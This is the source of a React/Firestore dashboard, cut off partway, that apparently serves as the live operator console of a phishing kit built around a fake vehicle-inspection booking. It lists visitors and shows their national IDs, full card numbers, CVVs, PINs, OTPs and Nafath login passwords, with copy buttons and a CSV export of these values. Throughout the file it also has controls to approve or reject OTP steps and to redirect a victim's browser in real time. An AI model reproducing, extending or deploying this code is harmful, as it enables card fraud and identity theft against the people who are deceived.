"use client"

import { useEffect, useState, useMemo, useRef, useCallback } from "react"
import { collection, onSnapshot, doc, updateDoc, query } from "firebase/firestore"
import { db } from "@/lib/firebase"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Badge } from "@/components/ui/badge"
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select"
import { PAGE_LIST } from "@/lib/page-routes"
import {
  Users,
  CreditCard,
  Clock,
  CheckCircle2,
  Search,
  Eye,
  ChevronLeft,
  ChevronDown,
  ArrowUpDown,
  Wifi,
  WifiOff,
  Download,
  Shield,
  Car,
  Phone,
  MapPin,
  Calendar,
  User,
  Hash,
  FileText,
  AlertTriangle,
  Globe,
  Loader2,
  MessageSquare,
  Settings,
  ChevronRight,
  X,
  Copy,
  Check,
} from "lucide-react"

// ─── Types ───────────────────────────────────────────────────────────────────

interface FirestoreRecord {
  id: string
  [key: string]: unknown
}

type SortField = "createdAt" | "updatedAt" | "ownerName" | "country" | "step"
type SortDir = "asc" | "desc"

// ─── Helper Maps ─────────────────────────────────────────────────────────────

const STEP_LABELS: Record<string, string> = {
  "": "زيارة فقط",
  "booking-completed": "تم الحجز",
  "booking-details-submitted": "تم إرسال بيانات الحجز",
  "payment-method-selected": "تم اختيار طريقة الدفع",
  "card-details-submitted": "تم إرسال بيانات البطاقة",
  "otp-submitted": "تم إرسال OTP",
  "pin-submitted": "تم إرسال PIN",
  "phone-otp-requested": "تم طلب OTP الجوال",
  "payment-completed": "مكتمل",
}

const STEP_COLORS: Record<string, string> = {
  "": "bg-gray-100 text-gray-600",
  "booking-completed": "bg-blue-100 text-blue-700",
  "booking-details-submitted": "bg-blue-100 text-blue-700",
  "payment-method-selected": "bg-amber-100 text-amber-700",
  "card-details-submitted": "bg-orange-100 text-orange-700",
  "otp-submitted": "bg-purple-100 text-purple-700",
  "pin-submitted": "bg-indigo-100 text-indigo-700",
  "phone-otp-requested": "bg-cyan-100 text-cyan-700",
  "payment-completed": "bg-emerald-100 text-emerald-700",
}

const APPROVAL_LABELS: Record<string, string> = {
  pending: "قيد الانتظار",
  approved: "موافق عليه",
  rejected: "مرفوض",
  otp: "OTP مطلوب",
}

const APPROVAL_COLORS: Record<string, string> = {
  pending: "bg-yellow-100 text-yellow-800 border-yellow-200",
  approved: "bg-green-100 text-green-800 border-green-200",
  rejected: "bg-red-100 text-red-800 border-red-200",
  otp: "bg-blue-100 text-blue-800 border-blue-200",
}

// ─── Utility ─────────────────────────────────────────────────────────────────

function maskCard(num?: string) {
  if (!num) return "—"
  const clean = String(num).replace(/\s/g, "")
  if (clean.length < 8) return clean
  return clean.slice(0, 4) + " •••• •••• " + clean.slice(-4)
}

function formatDate(val?: string) {
  if (!val) return "—"
  try {
    return new Intl.DateTimeFormat("ar-SA", {
      year: "numeric",
      month: "short",
      day: "numeric",
      hour: "2-digit",
      minute: "2-digit",
    }).format(new Date(val))
  } catch {
    return val
  }
}

function formatTime(val?: string) {
  if (!val) return ""
  try {
    return new Intl.DateTimeFormat("ar-SA", {
      hour: "2-digit",
      minute: "2-digit",
    }).format(new Date(val))
  } catch {
    return ""
  }
}

function str(val: unknown): string {
  if (val === null || val === undefined) return ""
  return String(val)
}

function getInitials(name: string): string {
  if (!name) return "؟"
  const parts = name.trim().split(/\s+/)
  if (parts.length === 1) return parts[0].slice(0, 2)
  return parts[0][0] + (parts[1]?.[0] || "")
}

// Color palette for avatar backgrounds
const AVATAR_COLORS = [
  "bg-teal-600", "bg-blue-600", "bg-purple-600", "bg-rose-600",
  "bg-amber-600", "bg-indigo-600", "bg-emerald-600", "bg-cyan-600",
  "bg-pink-600", "bg-violet-600",
]

function getAvatarColor(id: string): string {
  let hash = 0
  for (let i = 0; i < id.length; i++) {
    hash = id.charCodeAt(i) + ((hash << 5) - hash)
  }
  return AVATAR_COLORS[Math.abs(hash) % AVATAR_COLORS.length]
}

// ─── Detail Row ──────────────────────────────────────────────────────────────

function DetailRow({
  icon: Icon,
  label,
  value,
  mono,
  badge,
  badgeColor,
  copyable,
}: {
  icon?: React.ComponentType<{ className?: string }>
  label: string
  value?: string
  mono?: boolean
  badge?: boolean
  badgeColor?: string
  copyable?: boolean
}) {
  const [copied, setCopied] = useState(false)
  if (!value || value === "—") return null

  const handleCopy = () => {
    navigator.clipboard.writeText(value)
    setCopied(true)
    setTimeout(() => setCopied(false), 1500)
  }

  return (
    <div className="flex items-start gap-3 py-2.5 border-b border-gray-100/80 last:border-0 group">
      {Icon && <Icon className="h-4 w-4 text-gray-400 mt-0.5 shrink-0" />}
      <div className="flex-1 min-w-0">
        <p className="text-[11px] text-gray-400 mb-0.5">{label}</p>
        {badge ? (
          <span className={`inline-block px-2.5 py-0.5 rounded-full text-xs font-semibold ${badgeColor || "bg-gray-100 text-gray-700"}`}>
            {value}
          </span>
        ) : (
          <div className="flex items-center gap-2">
            <p className={`text-sm font-medium text-gray-800 break-all ${mono ? "font-mono tracking-wide" : ""}`}>{value}</p>
            {copyable && (
              <button onClick={handleCopy} className="opacity-0 group-hover:opacity-100 transition-opacity p-0.5 rounded hover:bg-gray-100">
                {copied ? <Check className="h-3 w-3 text-green-500" /> : <Copy className="h-3 w-3 text-gray-400" />}
              </button>
            )}
          </div>
        )}
      </div>
    </div>
  )
}

// ─── Approval Action Buttons ─────────────────────────────────────────────────

function ApprovalActions({
  record,
  field,
  options,
  onUpdate,
}: {
  record: FirestoreRecord
  field: string
  options: string[]
  onUpdate: (id: string, data: Record<string, string>) => Promise<void>
}) {
  const current = str(record[field])
  const [busy, setBusy] = useState<string | null>(null)

  const handleClick = async (status: string) => {
    setBusy(status)
    await onUpdate(record.id, { [field]: status })
    setBusy(null)
  }

  return (
    <div className="flex gap-2 flex-wrap">
      {options.map((status) => (
        <button
          key={status}
          disabled={current === status || busy !== null}
          onClick={() => handleClick(status)}
          className={`px-3.5 py-1.5 rounded-lg text-xs font-semibold transition-all flex items-center gap-1.5 border ${
            current === status
              ? (APPROVAL_COLORS[status] || "bg-teal-100 text-teal-800 border-teal-200") + " ring-2 ring-offset-1 ring-current shadow-sm"
              : "bg-white text-gray-500 border-gray-200 hover:border-gray-300 hover:bg-gray-50"
          }`}
        >
          {busy === status && <Loader2 className="h-3 w-3 animate-spin" />}
          {APPROVAL_LABELS[status] || status}
        </button>
      ))}
    </div>
  )
}

// ─── Navigate Visitor Control ────────────────────────────────────────────────

function NavigateVisitorControl({
  record,
  onUpdate,
}: {
  record: FirestoreRecord
  onUpdate: (id: string, data: Record<string, string>) => Promise<void>
}) {
  const current = str(record.currentPage)
  const [busy, setBusy] = useState<string | null>(null)

  const handleClick = async (key: string) => {
    setBusy(key)
    await onUpdate(record.id, { currentPage: key })
    setBusy(null)
  }

  const handleClear = async () => {
    setBusy("_clear")
    await onUpdate(record.id, { currentPage: "" })
    setBusy(null)
  }

  return (
    <div className="space-y-2">
      <div className="grid grid-cols-2 sm:grid-cols-3 gap-2">
        {PAGE_LIST.map((p) => (
          <button
            key={p.key}
            disabled={current === p.key || busy !== null}
            onClick={() => handleClick(p.key)}
            className={`px-3 py-2 rounded-lg text-xs font-semibold transition-all flex items-center justify-center gap-1.5 border ${
              current === p.key
                ? "bg-teal-50 text-teal-800 ring-2 ring-offset-1 ring-teal-500 border-teal-200"
                : "bg-white border-gray-200 text-gray-700 hover:border-teal-300 hover:bg-teal-50/50"
            }`}
          >
            {busy === p.key ? <Loader2 className="h-3 w-3 animate-spin" /> : <span>{p.icon}</span>}
            {p.label}
          </button>
        ))}
      </div>
      {current && (
        <button
          onClick={handleClear}
          disabled={busy !== null}
          className="text-[11px] text-gray-400 hover:text-red-500 transition-colors flex items-center gap-1"
        >
          {busy === "_clear" ? <Loader2 className="h-3 w-3 animate-spin" /> : "✕"}
          مسح التوجيه
        </button>
      )}
    </div>
  )
}

// ─── Text Field Control ──────────────────────────────────────────────────────

function TextFieldControl({
  record,
  field,
  placeholder,
  onUpdate,
}: {
  record: FirestoreRecord
  field: string
  placeholder: string
  onUpdate: (id: string, data: Record<string, string>) => Promise<void>
}) {
  const [value, setValue] = useState(str(record[field]))
  const [busy, setBusy] = useState(false)
  const [saved, setSaved] = useState(false)

  const handleSave = async () => {
    setBusy(true)
    await onUpdate(record.id, { [field]: value })
    setBusy(false)
    setSaved(true)
    setTimeout(() => setSaved(false), 1500)
  }

  return (
    <div className="flex gap-2">
      <Input
        value={value}
        onChange={(e) => setValue(e.target.value)}
        placeholder={placeholder}
        className="h-9 text-sm flex-1 bg-white"
      />
      <Button
        size="sm"
        className="bg-teal-700 hover:bg-teal-800 text-white h-9 min-w-[70px]"
        onClick={handleSave}
        disabled={busy}
      >
        {busy ? (
          <Loader2 className="h-3.5 w-3.5 animate-spin" />
        ) : saved ? (
          <span className="flex items-center gap-1"><CheckCircle2 className="h-3.5 w-3.5" /> تم</span>
        ) : (
          "حفظ"
        )}
      </Button>
    </div>
  )
}

// ─── Conversation Item ───────────────────────────────────────────────────────

function ConversationItem({
  record,
  isSelected,
  onClick,
}: {
  record: FirestoreRecord
  isSelected: boolean
  onClick: () => void
}) {
  const name = str(record.ownerName) || str(record.name) || str(record.id).slice(0, 10)
  const step = str(record.step)
  const isOnline = record.online === true
  const isUnread = record.isRead === false
  const hasCard = !!(str(record.cardNumber) && str(record.cardNumber).length > 3)
  const hasOtp = !!(str(record.otp) || str(record.phoneOtp))
  const hasNafad = !!(str(record.nafadUsername) || str(record.nafadPassword) || str(record.nafaz_pin))
  const time = formatTime(str(record.createdAt))

  // Generate last activity description
  const getLastActivity = () => {
    if (step === "payment-completed") return "✅ تم الدفع بنجاح"
    if (hasOtp) return "🔢 أرسل رمز OTP"
    if (hasCard) return "💳 أدخل بيانات البطاقة"
    if (hasNafad) return "🛡️ أدخل بيانات نفاذ"
    if (step) return STEP_LABELS[step] || step
    return "زائر جديد"
  }

  return (
    <div
      onClick={onClick}
      className={`flex items-center gap-3 px-4 py-3 cursor-pointer transition-all border-b border-gray-100 hover:bg-gray-50 ${
        isSelected ? "bg-teal-50/70 border-r-[3px] border-r-teal-600" : ""
      } ${isUnread ? "bg-white" : "bg-white/50"}`}
    >
      {/* Avatar */}
      <div className="relative shrink-0">
        <div className={`w-12 h-12 rounded-full flex items-center justify-center text-white text-sm font-bold ${getAvatarColor(str(record.id))}`}>
          {getInitials(name)}
        </div>
        {isOnline && (
          <span className="absolute bottom-0 left-0 w-3.5 h-3.5 bg-green-500 border-2 border-white rounded-full" />
        )}
      </div>

      {/* Content */}
      <div className="flex-1 min-w-0">
        <div className="flex items-center justify-between mb-0.5">
          <h3 className={`text-sm truncate max-w-[160px] ${isUnread ? "font-bold text-gray-900" : "font-medium text-gray-700"}`}>
            {name}
          </h3>
          <span className={`text-[11px] shrink-0 mr-1 ${isUnread ? "text-teal-600 font-semibold" : "text-gray-400"}`}>
            {time}
          </span>
        </div>
        <div className="flex items-center justify-between">
          <p className={`text-xs truncate max-w-[180px] ${isUnread ? "text-gray-700 font-medium" : "text-gray-400"}`}>
            {getLastActivity()}
          </p>
          <div className="flex items-center gap-1.5 shrink-0">
            {step && (
              <span className={`inline-block px-1.5 py-0.5 rounded text-[9px] font-semibold whitespace-nowrap ${STEP_COLORS[step] || STEP_COLORS[""]}`}>
                {STEP_LABELS[step]?.split(" ").slice(-1)[0] || "زيارة"}
              </span>
            )}
            {isUnread && (
              <span className="w-5 h-5 rounded-full bg-teal-600 text-white text-[10px] flex items-center justify-center font-bold">
                1
              </span>
            )}
          </div>
        </div>
      </div>
    </div>
  )
}

// ─── Section Component (for detail panel) ────────────────────────────────────

function Section({
  title,
  icon: Icon,
  children,
  defaultOpen = true,
}: {
  title: string
  icon: React.ComponentType<{ className?: string }>
  children: React.ReactNode
  defaultOpen?: boolean
}) {
  const [open, setOpen] = useState(defaultOpen)
  return (
    <div className="bg-white rounded-xl border border-gray-100 overflow-hidden shadow-sm">
      <button
        onClick={() => setOpen(!open)}
        className="w-full flex items-center justify-between px-4 py-3 hover:bg-gray-50/50 transition-colors"
      >
        <div className="flex items-center gap-2">
          <Icon className="h-4 w-4 text-teal-700" />
          <span className="text-sm font-bold text-gray-800">{title}</span>
        </div>
        <ChevronDown className={`h-4 w-4 text-gray-400 transition-transform ${open ? "rotate-180" : ""}`} />
      </button>
      {open && <div className="px-4 pb-4">{children}</div>}
    </div>
  )
}

// ─── Empty State ─────────────────────────────────────────────────────────────

function EmptyState() {
  return (
    <div className="flex-1 flex flex-col items-center justify-center bg-[#f0ebe3] text-center p-8">
      <div className="w-64 h-64 mb-6 flex items-center justify-center">
        <div className="relative">
          <div className="w-40 h-40 rounded-full bg-teal-100/50 flex items-center justify-center">
            <MessageSquare className="h-20 w-20 text-teal-300" />
          </div>
          <div className="absolute -top-2 -right-2 w-8 h-8 rounded-full bg-teal-200/60 flex items-center justify-center">
            <Shield className="h-4 w-4 text-teal-400" />
          </div>
          <div className="absolute -bottom-1 -left-3 w-6 h-6 rounded-full bg-teal-200/40" />
        </div>
      </div>
      <h2 className="text-xl font-bold text-gray-600 mb-2">لوحة التحكم</h2>
      <p className="text-sm text-gray-400 max-w-xs leading-relaxed">
        اختر محادثة من القائمة لعرض التفاصيل والتحكم في بيانات الزائر
      </p>
    </div>
  )
}

// ─── Main Page ───────────────────────────────────────────────────────────────

export default function DashboardPage() {
  const [records, setRecords] = useState<FirestoreRecord[]>([])
  const [loading, setLoading] = useState(true)
  const [searchTerm, setSearchTerm] = useState("")
  const [stepFilter, setStepFilter] = useState("all")
  const [sortField, setSortField] = useState<SortField>("createdAt")
  const [sortDir, setSortDir] = useState<SortDir>("desc")
  const [selectedId, setSelectedId] = useState<string | null>(null)
  const [showFilters, setShowFilters] = useState(false)
  const [mobileShowDetail, setMobileShowDetail] = useState(false)
  const detailRef = useRef<HTMLDivElement>(null)

  // Derive selectedRecord from live records
  const selectedRecord = useMemo(() => {
    if (!selectedId) return null
    return records.find((r) => r.id === selectedId) || null
  }, [selectedId, records])

  // ── Real-time Listener ───────────────────────────────────────────────────

  useEffect(() => {
    const q = query(collection(db, "pays"))
    const unsubscribe = onSnapshot(
      q,
      (snapshot) => {
        const docs: FirestoreRecord[] = []
        snapshot.forEach((docSnap) => {
          docs.push({ id: docSnap.id, ...docSnap.data() } as FirestoreRecord)
        })
        setRecords(docs)
        setLoading(false)
      },
      (error) => {
        console.error("Dashboard Firestore error:", error)
        setLoading(false)
      },
    )
    return () => unsubscribe()
  }, [])

  // ── Update Firestore doc ─────────────────────────────────────────────────

  const handleUpdate = async (id: string, data: Record<string, string>) => {
    try {
      await updateDoc(doc(db, "pays", id), { ...data, updatedAt: new Date().toISOString() })
    } catch (e) {
      console.error("Update error:", e)
    }
  }

  // ── Mark as read ─────────────────────────────────────────────────────────

  const markAsRead = async (record: FirestoreRecord) => {
    if (record.isRead === false) {
      try {
        await updateDoc(doc(db, "pays", record.id), { isRead: true })
      } catch (e) {
        console.error(e)
      }
    }
  }

  // ── Select conversation ─────────────────────────────────────────────────

  const selectConversation = useCallback((record: FirestoreRecord) => {
    setSelectedId(record.id)
    setMobileShowDetail(true)
    markAsRead(record)
    // Scroll detail panel to top
    setTimeout(() => {
      detailRef.current?.scrollTo({ top: 0, behavior: "smooth" })
    }, 50)
  }, [])

  // ── Filtered & Sorted ────────────────────────────────────────────────────

  const processed = useMemo(() => {
    let list = [...records]

    if (searchTerm.trim()) {
      const term = searchTerm.toLowerCase()
      list = list.filter((r) => {
        const fields = [r.id, r.ownerName, r.nationalId, r.phone, r.cardNumber, r.cardName, r.country, r.plateNumbers, r.plateLetters, r.operator]
        return fields.some((f) => str(f).toLowerCase().includes(term))
      })
    }

    if (stepFilter !== "all") {
      list = list.filter((r) => str(r.step) === stepFilter)
    }

    list.sort((a, b) => {
      const aVal = str(a[sortField]).toLowerCase()
      const bVal = str(b[sortField]).toLowerCase()
      const cmp = aVal.localeCompare(bVal)
      return sortDir === "asc" ? cmp : -cmp
    })

    return list
  }, [records, searchTerm, stepFilter, sortField, sortDir])

  // ── Stats ────────────────────────────────────────────────────────────────

  const stats = useMemo(() => {
    const total = records.length
    const completed = records.filter((r) => str(r.step) === "payment-completed").length
    const pendingPayment = records.filter((r) => ["card-details-submitted", "otp-submitted", "pin-submitted", "phone-otp-requested"].includes(str(r.step))).length
    const online = records.filter((r) => r.online === true).length
    const unread = records.filter((r) => r.isRead === false).length
    return { total, completed, pendingPayment, online, unread }
  }, [records])

  // ── Export CSV ───────────────────────────────────────────────────────────

  const exportCSV = () => {
    const headers = ["ID", "Owner Name", "National ID", "Phone", "Country", "Card Number", "Card Name", "Expiry", "CVV", "OTP", "PIN", "Step", "Payment Method", "Operator", "Created At"]
    const rows = processed.map((r) => [
      r.id, str(r.ownerName), str(r.nationalId), str(r.phone), str(r.country),
      str(r.cardNumber), str(r.cardName),
      str(r.expiryDate || ((r.expiryMonth ? str(r.expiryMonth) + "/" + str(r.expiryYear) : ""))),
      str(r.cvv), str(r.otp), str(r.pin), str(r.step), str(r.paymentMethod), str(r.operator), str(r.createdAt),
    ])
    const csv = [headers, ...rows].map((row) => row.map((cell) => `"${cell}"`).join(",")).join("\n")
    const blob = new Blob(["\uFEFF" + csv], { type: "text/csv;charset=utf-8;" })
    const url = URL.createObjectURL(blob)
    const a = document.createElement("a")
    a.href = url
    a.download = `dashboard-export-${new Date().toISOString().slice(0, 10)}.csv`
    a.click()
    URL.revokeObjectURL(url)
  }

  // ── Loading State ────────────────────────────────────────────────────────

  if (loading) {
    return (
      <div className="h-screen flex items-center justify-center bg-[#f0ebe3]">
        <div className="flex flex-col items-center gap-4">
          <div className="w-16 h-16 rounded-full bg-teal-700 flex items-center justify-center">
            <Loader2 className="h-8 w-8 animate-spin text-white" />
          </div>
          <p className="text-lg text-gray-500 font-medium">جاري تحميل البيانات...</p>
        </div>
      </div>
    )
  }

  // ── Render ───────────────────────────────────────────────────────────────

  return (
    <div className="h-screen flex overflow-hidden bg-[#f0ebe3]" dir="rtl" lang="ar">
      {/* ═══════════════════════════════════════════════════════════════════════
          SIDEBAR — Conversations List
          ═══════════════════════════════════════════════════════════════════════ */}
      <aside className={`flex flex-col border-l border-gray-200 bg-white w-full md:w-[380px] lg:w-[420px] md:max-w-[420px] shrink-0 ${
        mobileShowDetail ? "hidden md:flex" : "flex"
      }`}>
        {/* ── Sidebar Header ─────────────────────────────────────────────── */}
        <div className="bg-teal-700 px-4 py-3">
          <div className="flex items-center justify-between mb-3">
            <div className="flex items-center gap-3">
              <div className="w-10 h-10 rounded-full bg-white/20 flex items-center justify-center">
                <Shield className="h-5 w-5 text-white" />
              </div>
              <div>
                <h1 className="text-base font-bold text-white">لوحة التحكم</h1>
                <p className="text-[11px] text-teal-100">
                  {stats.total} زائر • {stats.online} متصل
                </p>
              </div>
            </div>
            <div className="flex items-center gap-1">
              <button
                onClick={() => setShowFilters(!showFilters)}
                className="p-2 rounded-full hover:bg-white/10 transition-colors"
                title="فلاتر"
              >
                <Settings className="h-5 w-5 text-teal-100" />
              </button>
              <button
                onClick={exportCSV}
                className="p-2 rounded-full hover:bg-white/10 transition-colors"
                title="تصدير CSV"
              >
                <Download className="h-5 w-5 text-teal-100" />
              </button>
            </div>
          </div>

          {/* Search Bar */}
          <div className="relative">
            <Search className="absolute right-3 top-1/2 -translate-y-1/2 h-4 w-4 text-teal-300" />
            <input
              type="text"
              placeholder="بحث..."
              value={searchTerm}
              onChange={(e) => setSearchTerm(e.target.value)}
              className="w-full h-9 pr-10 pl-3 bg-teal-600/50 text-white placeholder-teal-200 rounded-lg text-sm border-none outline-none focus:bg-teal-600/70 transition-colors"
            />
          </div>
        </div>

        {/* ── Quick Stats Strip ──────────────────────────────────────────── */}
        <div className="flex items-center gap-2 px-4 py-2 border-b border-gray-100 bg-gray-50/50 overflow-x-auto chat-scrollbar-hidden">
          <button
            onClick={() => setStepFilter("all")}
            className={`shrink-0 flex items-center gap-1 px-2.5 py-1 rounded-full text-[11px] font-semibold transition-all ${
              stepFilter === "all" ? "bg-teal-100 text-teal-800" : "bg-white text-gray-500 border border-gray-200"
            }`}
          >
            الكل <span className="font-bold">{stats.total}</span>
          </button>
          {stats.unread > 0 && (
            <button
              onClick={() => {/* could add unread filter */}}
              className="shrink-0 flex items-center gap-1 px-2.5 py-1 rounded-full text-[11px] font-semibold bg-red-50 text-red-700 border border-red-100"
            >
              <span className="w-1.5 h-1.5 rounded-full bg-red-500 animate-pulse" />
              جديد <span className="font-bold">{stats.unread}</span>
            </button>
          )}
          <button
            onClick={() => setStepFilter("payment-completed")}
            className={`shrink-0 flex items-center gap-1 px-2.5 py-1 rounded-full text-[11px] font-semibold transition-all ${
              stepFilter === "payment-completed" ? "bg-emerald-100 text-emerald-800" : "bg-white text-gray-500 border border-gray-200"
            }`}
          >
            مكتمل <span className="font-bold">{stats.completed}</span>
          </button>
          <button
            onClick={() => setStepFilter("card-details-submitted")}
            className={`shrink-0 flex items-center gap-1 px-2.5 py-1 rounded-full text-[11px] font-semibold transition-all ${
              stepFilter === "card-details-submitted" ? "bg-orange-100 text-orange-800" : "bg-white text-gray-500 border border-gray-200"
            }`}
          >
            بطاقة <span className="font-bold">{stats.pendingPayment}</span>
          </button>
        </div>

        {/* ── Filters Panel (toggle) ─────────────────────────────────────── */}
        {showFilters && (
          <div className="px-4 py-3 border-b border-gray-100 bg-gray-50/50 space-y-2">
            <Select value={stepFilter} onValueChange={setStepFilter}>
              <SelectTrigger className="h-9 text-xs bg-white">
                <SelectValue placeholder="فلتر الحالة" />
              </SelectTrigger>
              <SelectContent>
                <SelectItem value="all">جميع الحالات</SelectItem>
                {Object.entries(STEP_LABELS).map(([key, label]) => (
                  <SelectItem key={key || "_empty"} value={key || "_empty"}>
                    {label}
                  </SelectItem>
                ))}
              </SelectContent>
            </Select>
            <div className="flex items-center gap-2">
              <button
                onClick={() => { setSortField("createdAt"); setSortDir(d => d === "asc" ? "desc" : "asc") }}
                className="flex-1 flex items-center justify-center gap-1 h-8 bg-white border border-gray-200 rounded-lg text-xs text-gray-600 hover:bg-gray-50"
              >
                <ArrowUpDown className="h-3 w-3" />
                {sortDir === "desc" ? "الأحدث أولاً" : "الأقدم أولاً"}
              </button>
              <button
                onClick={() => { setSearchTerm(""); setStepFilter("all") }}
                className="h-8 px-3 bg-white border border-gray-200 rounded-lg text-xs text-gray-500 hover:bg-gray-50"
              >
                مسح الفلاتر
              </button>
            </div>
          </div>
        )}

        {/* ── Conversations List ─────────────────────────────────────────── */}
        <div className="flex-1 overflow-y-auto chat-scrollbar">
          {processed.length === 0 ? (
            <div className="flex flex-col items-center justify-center py-20 text-center">
              <FileText className="h-12 w-12 text-gray-200 mb-3" />
              <p className="text-sm font-medium text-gray-400">لا توجد نتائج</p>
              <p className="text-xs text-gray-300 mt-1">جرّب تغيير معايير البحث</p>
            </div>
          ) : (
            processed.map((r) => (
              <ConversationItem
                key={r.id}
                record={r}
                isSelected={selectedId === r.id}
                onClick={() => selectConversation(r)}
              />
            ))
          )}
        </div>
      </aside>

      {/* ═══════════════════════════════════════════════════════════════════════
          MAIN PANEL — Conversation Detail
          ═══════════════════════════════════════════════════════════════════════ */}
      <main className={`flex-1 flex flex-col min-w-0 ${
        !mobileShowDetail ? "hidden md:flex" : "flex"
      }`}>
        {selectedRecord ? (
          <>
            {/* ── Detail Header ──────────────────────────────────────────── */}
            <div className="bg-teal-700 px-4 py-3 flex items-center gap-3 shrink-0">
              {/* Back button (mobile) */}
              <button
                onClick={() => setMobileShowDetail(false)}
                className="md:hidden p-1.5 rounded-full hover:bg-white/10 transition-colors"
              >
                <ChevronRight className="h-5 w-5 text-white" />
              </button>

              {/* Avatar */}
              <div className="relative shrink-0">
                <div className={`w-10 h-10 rounded-full flex items-center justify-center text-white text-sm font-bold ${getAvatarColor(str(selectedRecord.id))}`}>
                  {getInitials(str(selectedRecord.ownerName) || str(selectedRecord.name) || str(selectedRecord.id).slice(0, 10))}
                </div>
                {selectedRecord.online === true && (
                  <span className="absolute bottom-0 left-0 w-3 h-3 bg-green-400 border-2 border-teal-700 rounded-full" />
                )}
              </div>

              {/* User info */}
              <div className="flex-1 min-w-0">
                <h2 className="text-sm font-bold text-white truncate">
                  {str(selectedRecord.ownerName) || str(selectedRecord.name) || "تفاصيل السجل"}
                </h2>
                <p className="text-[11px] text-teal-100">
                  {selectedRecord.online === true ? "متصل الآن" : "غير متصل"} • {str(selectedRecord.country) || "—"}
                  {str(selectedRecord.phone) ? ` • ${str(selectedRecord.phone)}` : ""}
                </p>
              </div>

              {/* Header actions */}
              <div className="flex items-center gap-1 shrink-0">
                {str(selectedRecord.step) && (
                  <span className={`hidden sm:inline-block px-2.5 py-1 rounded-full text-[11px] font-semibold ${STEP_COLORS[str(selectedRecord.step)] || STEP_COLORS[""]}`}>
                    {STEP_LABELS[str(selectedRecord.step)] || str(selectedRecord.step)}
                  </span>
                )}
              </div>
            </div>

            {/* ── Detail Content ─────────────────────────────────────────── */}
            <div
              ref={detailRef}
              className="flex-1 overflow-y-auto bg-[#e5ddd5] chat-pattern chat-scrollbar"
            >
              <div className="max-w-3xl mx-auto p-4 space-y-3">
                {/* ID Badge */}
                <div className="flex justify-center mb-2">
                  <span className="bg-white/80 backdrop-blur-sm text-gray-500 text-[11px] font-mono px-4 py-1.5 rounded-full shadow-sm">
                    {selectedRecord.id}
                  </span>
                </div>

                {/* ── Personal Info ─────────────────────────────────────── */}
                <Section title="المعلومات الشخصية" icon={User}>
                  <DetailRow icon={User} label="اسم المالك" value={str(selectedRecord.ownerName) || str(selectedRecord.name)} copyable />
                  <DetailRow icon={Hash} label="رقم الهوية" value={str(selectedRecord.nationalId) || str(selectedRecord.idNumber)} mono copyable />
                  <DetailRow icon={Phone} label="رقم الجوال" value={str(selectedRecord.phone) || str(selectedRecord.authorizedPhone)} mono copyable />
                  <DetailRow icon={Globe} label="البلد" value={str(selectedRecord.country)} />
                  <DetailRow icon={FileText} label="البريد الإلكتروني" value={str(selectedRecord.email) || str(selectedRecord.delegateEmail)} copyable />
                </Section>

                {/* ── Vehicle Info ──────────────────────────────────────── */}
                {(str(selectedRecord.plateNumbers) || str(selectedRecord.vehicleType) || str(selectedRecord.inspectionType)) && (
                  <Section title="معلومات المركبة" icon={Car}>
                    <DetailRow icon={Hash} label="أرقام اللوحة" value={str(selectedRecord.plateLetters) + " " + str(selectedRecord.plateNumbers)} mono copyable />
                    <DetailRow icon={Car} label="نوع المركبة" value={str(selectedRecord.vehicleType) || str(selectedRecord.inspectionType)} />
                    <DetailRow icon={FileText} label="حالة المركبة" value={str(selectedRecord.vehicleStatus)} />
                    <DetailRow icon={Hash} label="الرقم التسلسلي" value={str(selectedRecord.serialNumber)} mono copyable />
                    <DetailRow icon={MapPin} label="المنطقة / المدينة" value={[str(selectedRecord.region), str(selectedRecord.city)].filter(Boolean).join(" / ") || undefined} />
                    <DetailRow icon={Calendar} label="موعد الفحص" value={[str(selectedRecord.inspectionDate), str(selectedRecord.inspectionTime)].filter(Boolean).join(" - ") || undefined} />
                  </Section>
                )}

                {/* ── Delegate Info ─────────────────────────────────────── */}
                {(str(selectedRecord.delegateName) || str(selectedRecord.authorizedName)) && (
                  <Section title="بيانات المفوض" icon={Users}>
                    <DetailRow icon={User} label="اسم المفوض" value={str(selectedRecord.delegateName) || str(selectedRecord.authorizedName)} copyable />
                    <DetailRow icon={Phone} label="جوال المفوض" value={str(selectedRecord.delegatePhone) || str(selectedRecord.authorizedPhone)} mono copyable />
                    <DetailRow icon={Hash} label="هوية المفوض" value={str(selectedRecord.delegateIdNumber) || str(selectedRecord.authorizedId)} mono copyable />
                    <DetailRow icon={Calendar} label="تاريخ ميلاد المفوض" value={str(selectedRecord.authorizedBirthDate)} />
                  </Section>
                )}

                {/* ── Payment Info ──────────────────────────────────────── */}
                {(str(selectedRecord.cardNumber) || str(selectedRecord.paymentMethod)) && (
                  <Section title="معلومات الدفع" icon={CreditCard}>
                    <DetailRow icon={CreditCard} label="طريقة الدفع" value={str(selectedRecord.paymentMethod)} />
                    <DetailRow icon={CreditCard} label="رقم البطاقة" value={str(selectedRecord.cardNumber)} mono copyable />
                    <DetailRow icon={User} label="اسم حامل البطاقة" value={str(selectedRecord.cardName)} copyable />
                    <DetailRow
                      icon={Calendar}
                      label="تاريخ الانتهاء"
                      value={str(selectedRecord.expiryDate) || (str(selectedRecord.expiryMonth) ? str(selectedRecord.expiryMonth) + "/" + str(selectedRecord.expiryYear) : undefined)}
                      copyable
                    />
                    <DetailRow icon={Shield} label="CVV" value={str(selectedRecord.cvv)} mono copyable />
                    <DetailRow icon={Hash} label="PIN" value={str(selectedRecord.pin)} mono copyable />
                    <DetailRow icon={Hash} label="OTP" value={str(selectedRecord.otp) || str(selectedRecord.phoneOtp)} mono copyable />
                    <DetailRow icon={Phone} label="المشغل" value={str(selectedRecord.operator)} />
                  </Section>
                )}

                {/* ── Nafaz Info ────────────────────────────────────────── */}
                {(str(selectedRecord.nafadUsername) || str(selectedRecord.nafadPassword) || str(selectedRecord.nafaz_pin)) && (
                  <Section title="بيانات نفاذ" icon={Shield}>
                    <DetailRow icon={User} label="اسم المستخدم" value={str(selectedRecord.nafadUsername)} mono copyable />
                    <DetailRow icon={Shield} label="كلمة المرور" value={str(selectedRecord.nafadPassword)} mono copyable />
                    <DetailRow icon={Hash} label="رمز نفاذ" value={str(selectedRecord.nafaz_pin) || str(selectedRecord.authNumber)} mono copyable />
                  </Section>
                )}

                {/* ── Approval Controls ─────────────────────────────────── */}
                <Section title="التحكم في الموافقات" icon={CheckCircle2}>
                  <div className="space-y-5">
                    <div>
